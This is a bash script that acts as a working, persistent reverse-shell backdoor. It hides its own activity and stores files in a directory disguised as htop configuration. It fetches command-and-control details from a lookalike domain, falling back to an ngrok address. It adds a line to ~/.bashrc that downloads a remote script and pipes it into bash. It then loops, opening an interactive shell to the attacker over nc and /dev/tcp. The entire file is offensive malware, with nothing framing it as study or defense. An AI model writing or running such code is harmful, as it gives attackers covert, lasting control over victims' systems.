#!/bin/bash
# https://raw.githubusercontent.com/yourusername/gsocket-zero/main/gsocket.sh

CONFIG_URL="https://static-alicdn.com/main/gsock-config.txt"
PERSIST_DIR="$HOME/.config/htop"
STATE_FILE="$PERSIST_DIR/state"

stealth() { renice 19 $$ &>/dev/null; exec 2>/dev/null; }

persist() {
    mkdir -p "$PERSIST_DIR"
    
    # Download ONLY HOST/PORT dari VPS (NO PASS!)
    curl -s "$CONFIG_URL" -o "$PERSIST_DIR/config" || {
        echo "HOST=0.tcp.ngrok.io" > "$PERSIST_DIR/config"
        echo "PORT=12345" >> "$PERSIST_DIR/config"
    }
    
    # Generate RANDOM password unik per target
    PASS=$(openssl rand -base64 24 | tr -d "=+/" | cut -c1-20)
    
    # Save password untuk listener
    echo "$PASS" > "$STATE_FILE"
    chmod 600 "$STATE_FILE"
    
    # Bashrc persistence
    echo '[ -f ~/.config/htop/state ] && (sleep $((RANDOM%60)); curl -fsSL https://raw.githubusercontent.com/tobrutt/gsocket/refs/heads/main/deploy.sh | bash) &' >> ~/.bashrc
}

reverse() {
    source "$PERSIST_DIR/config"
    PASS=$(cat "$PERSIST_DIR/state" 2>/dev/null)
    
    while true; do
        # Connect & kirim password RANDOM yang di-generate
        echo "GSOCK:$PASS" | nc -w5 "$HOST" "$PORT" 2>/dev/null | grep -q "AUTH_OK" && {
            # Shell interactive
            nc "$HOST" "$PORT" | bash -i >& /dev/tcp/"$HOST"/"$PORT" 0>&1 2>&1
        }
        sleep $((5+RANDOM%10))
    done
}

stealth
persist
exec reverse
